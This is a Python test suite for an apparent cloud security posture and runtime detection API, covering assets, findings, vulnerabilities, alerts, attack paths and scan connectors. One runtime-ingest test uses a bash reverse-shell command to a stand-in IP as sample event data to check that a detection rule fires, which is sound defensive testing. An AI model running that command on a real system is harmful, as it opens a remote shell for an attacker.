from app import config
from app.connectors.base import AssetRecord, CollectionResult, Connector
from tests.conftest import AUTH


def test_health_and_dashboard(client):
    h = client.get("/api/health").json()
    assert h["status"] == "ok" and h["simulation_mode"] is True and h["azure_configured"] is False
    d = client.get("/api/dashboard").json()
    assert 0 < d["risk_score"] <= 100
    assert d["assets"]["total"] > 50
    assert set(d["findings_by_severity"]) == {"critical", "high", "medium", "low"}
    assert d["vulnerabilities"]["noise_reduction"]["percent"] > 30
    assert len(d["alerts_over_time"]) == 24
    assert d["top_risks"] and d["compliance"]
    assert all(t["hour"].endswith("Z") for t in d["alerts_over_time"])


def test_assets_filters_and_detail(client):
    all_assets = client.get("/api/assets").json()
    types = {a["type"] for a in all_assets}
    assert {"vm", "storage_account", "aks_cluster", "pod", "sql_server", "nsg", "identity", "key_vault",
            "function_app"} <= types
    vms = client.get("/api/assets", params={"type": "vm", "internet_exposed": True}).json()
    assert vms and all(v["type"] == "vm" and v["internet_exposed"] for v in vms)
    facets = client.get("/api/assets/facets").json()
    assert len(facets["subscriptions"]) == 3
    target = next(a for a in all_assets if a["name"] == "vm-pay-api-01")
    det = client.get("/api/assets/detail", params={"id": target["id"]}).json()
    assert det["asset"]["name"] == "vm-pay-api-01"
    assert {r["type"] for r in det["relationships"]} >= {"uses_identity", "protects"}
    assert any(v["cve_id"] == "CVE-2021-44228" for v in det["vulnerabilities"])
    assert client.get("/api/assets/detail", params={"id": "nope"}).status_code == 404


def test_findings_lifecycle(client):
    fs = client.get("/api/findings").json()
    assert fs and all(f["status"] == "open" for f in fs)
    sev_rank = ["critical", "high", "medium", "low"]
    assert [sev_rank.index(f["severity"]) for f in fs] == sorted(sev_rank.index(f["severity"]) for f in fs)
    fid = fs[0]["id"]
    r = client.patch(f"/api/findings/{fid}", json={"status": "suppressed"})
    assert r.status_code == 200 and r.json()["status"] == "suppressed"
    assert fid not in {f["id"] for f in client.get("/api/findings").json()}
    assert client.patch(f"/api/findings/{fid}", json={"status": "bogus"}).status_code == 422
    cis = client.get("/api/findings", params={"compliance": "CIS Azure 6"}).json()
    assert all(any(c.startswith("CIS Azure 6") for c in f["compliance"]) for f in cis)


def test_vulnerabilities_ranked_by_runtime_risk(client):
    vs = client.get("/api/vulnerabilities").json()
    scores = [v["risk_score"] for v in vs]
    assert scores == sorted(scores, reverse=True)
    top = vs[0]
    assert top["in_use"] is True
    dormant = client.get("/api/vulnerabilities", params={"in_use": False}).json()
    assert all(v["risk_score"] <= 20 for v in dormant)
    stats = client.get("/api/vulnerabilities/stats").json()
    assert stats["noise_reduction"]["dormant"] == len(dormant)


def test_runtime_ingest_creates_alert_with_timeline(client):
    asset = client.get("/api/assets", params={"type": "pod"}).json()[0]
    batch = [
        {"asset_id": asset["id"], "event_type": "process_exec",
         "process": {"name": "bash", "cmdline": "bash -i >& /dev/tcp/198.51.100.7/9001 0>&1", "parent_name": "node"},
         "container": {"name": "web", "pod": asset["name"]}},
        {"asset_id": asset["id"], "event_type": "network_connection",
         "network": {"direction": "outbound", "dst_ip": "198.51.100.7", "dst_port": 9001}},
    ]
    r = client.post("/api/runtime/events", json=batch, headers=AUTH)
    assert r.status_code == 202, r.text
    body = r.json()
    assert body["accepted"] == 2 and body["alerts_triggered"] >= 2
    alerts = client.get("/api/alerts", params={"asset_id": asset["id"]}).json()
    rev = next(a for a in alerts if a["rule_id"] == "CDR-001")
    assert rev["mitre_technique_id"] == "T1059.004"
    det = client.get(f"/api/alerts/{rev['id']}").json()
    assert any(t["triggered"] for t in det["timeline"])
    assert det["asset"]["id"] == asset["id"]
    assert client.patch(f"/api/alerts/{rev['id']}", json={"status": "resolved"}).json()["status"] == "resolved"
    events = client.get("/api/runtime/events", params={"asset_id": asset["id"]}).json()
    assert len(events) >= 2


def test_runtime_ingest_validation_and_schema(client):
    assert client.post("/api/runtime/events", json={"event_type": "teleport"}, headers=AUTH).status_code == 422
    assert client.post("/api/runtime/events", json="nope", headers=AUTH).status_code == 422
    too_long = {"event_type": "process_exec", "process": {"name": "x" * 1000}}
    assert client.post("/api/runtime/events", json=too_long, headers=AUTH).status_code == 422
    bad_port = {"event_type": "network_connection", "network": {"dst_ip": "1.2.3.4", "dst_port": 70000}}
    assert client.post("/api/runtime/events", json=bad_port, headers=AUTH).status_code == 422
    schema = client.get("/api/runtime/schema").json()
    assert "event_type" in schema["legacy"]["properties"]
    assert "schema_version" in schema["v1"]["properties"]


def test_runtime_ingest_token(client, monkeypatch):
    monkeypatch.setattr(config.settings, "ingest_api_token", "s3cret")
    ev = {"event_type": "file_access", "file": {"path": "/tmp/x"}}
    url = "/api/runtime/events"
    assert client.post(url, json=ev).status_code == 401
    assert client.post(url, json=ev, headers={"Authorization": "Bearer wrong"}).status_code == 401
    assert client.post(url, json=ev, headers={"Authorization": "Basic s3cret"}).status_code == 401
    assert client.post(url, json=ev, headers={"Authorization": "Bearer s3cret"}).status_code == 202
    assert client.post(url, json=ev, headers={"Authorization": "bearer s3cret"}).status_code == 202


def test_runtime_ingest_fails_closed_without_token(client, monkeypatch):
    monkeypatch.setattr(config.settings, "ingest_api_token", None)
    ev = {"event_type": "file_access", "file": {"path": "/tmp/x"}}
    assert client.post("/api/runtime/events", json=ev, headers=AUTH).status_code == 503
    monkeypatch.setattr(config.settings, "ingest_allow_unauthenticated", True)
    assert client.post("/api/runtime/events", json=ev).status_code == 202


def test_ingest_token_env_var_names(monkeypatch):
    monkeypatch.setenv("INGEST_API_TOKEN", "primary")
    assert config.Settings().ingest_api_token == "primary"
    monkeypatch.setenv("INGEST_API_TOKEN", "")
    monkeypatch.setenv("RUNTIME_INGEST_TOKEN", "legacy")
    assert config.Settings().ingest_api_token == "legacy"


def test_request_body_size_limit(client):
    big = [{"event_type": "file_access", "file": {"path": "/tmp/" + "a" * 4000}}] * 400  # ~1.7 MB
    r = client.post("/api/runtime/events", json=big, headers=AUTH)
    assert r.status_code == 413


def test_max_events_per_request(client, monkeypatch):
    monkeypatch.setattr(config.settings, "max_events_per_request", 2)
    ev = {"event_type": "file_access", "file": {"path": "/tmp/x"}}
    assert client.post("/api/runtime/events", json=[ev] * 3, headers=AUTH).status_code == 413


def test_future_timestamps_are_clamped(client):
    ev = {"event_type": "file_access", "file": {"path": "/tmp/x"}, "timestamp": "2999-01-01T00:00:00Z",
          "sensor_id": "clock-skew"}
    assert client.post("/api/runtime/events", json=ev, headers=AUTH).status_code == 202
    got = client.get("/api/runtime/events", params={"source": "sensor"}).json()
    assert got and all(not e["timestamp"].startswith("2999") for e in got)


def test_attack_paths_endpoints(client):
    paths = client.get("/api/attack-paths").json()
    assert paths and paths[0]["steps"]
    assert [p["score"] for p in paths] == sorted((p["score"] for p in paths), reverse=True)
    names = {p["title"] for p in paths}
    assert any("vm-pay-api-01" in n and "stpaycardvault01" in n for n in names)
    g = client.get("/api/attack-paths/graph", params={"limit": 5}).json()
    node_ids = {n["id"] for n in g["nodes"]}
    assert "internet" in node_ids
    assert all(e["source"] in node_ids and e["target"] in node_ids for e in g["edges"])


def test_rules_and_connectors(client):
    assert len(client.get("/api/rules/posture").json()) >= 15
    assert len(client.get("/api/rules/detection").json()) >= 8
    conns = {c["name"]: c for c in client.get("/api/connectors").json()}
    assert conns["azure"]["configured"] is False and conns["simulated"]["configured"] is True


def test_azure_scan_requires_configuration(client):
    r = client.post("/api/scans", json={"connector": "azure"})
    assert r.status_code == 400
    assert client.post("/api/scans", json={"connector": "nope"}).status_code == 404


class FakeConnector(Connector):
    name = "azure"
    provider = "azure"

    def is_configured(self):
        return True

    def collect(self):
        return CollectionResult(assets=[AssetRecord(
            id="/subscriptions/s1/resourcegroups/rg/providers/microsoft.storage/storageaccounts/real1",
            name="real1", type="storage_account", subscription_id="s1",
            properties={"allow_blob_public_access": True, "https_only": True, "min_tls_version": "TLS1_2"})])


def test_scan_endpoint_merges_results(empty_client, monkeypatch):
    from app.api import platform

    monkeypatch.setattr(platform, "build_registry", lambda s: {"azure": FakeConnector()})
    # run synchronously for the test
    monkeypatch.setattr(platform, "start_scan", lambda c, background=True: __import__(
        "app.services.scans", fromlist=["start_scan"]).start_scan(c, background=False))
    r = empty_client.post("/api/scans", json={"connector": "azure"})
    assert r.status_code == 202, r.text
    assert r.json()["status"] == "succeeded" and r.json()["assets_found"] == 1
    assets = empty_client.get("/api/assets", params={"source": "azure"}).json()
    assert [a["name"] for a in assets] == ["real1"]
    fs = empty_client.get("/api/findings", params={"source": "azure"}).json()
    assert [f["rule_id"] for f in fs] == ["AZ-STG-001"]
    assert empty_client.get("/api/scans").json()[0]["connector"] == "azure"


def test_empty_mode_has_no_seed(empty_client):
    assert empty_client.get("/api/assets").json() == []
    assert empty_client.get("/api/dashboard").json()["risk_score"] == 0.0
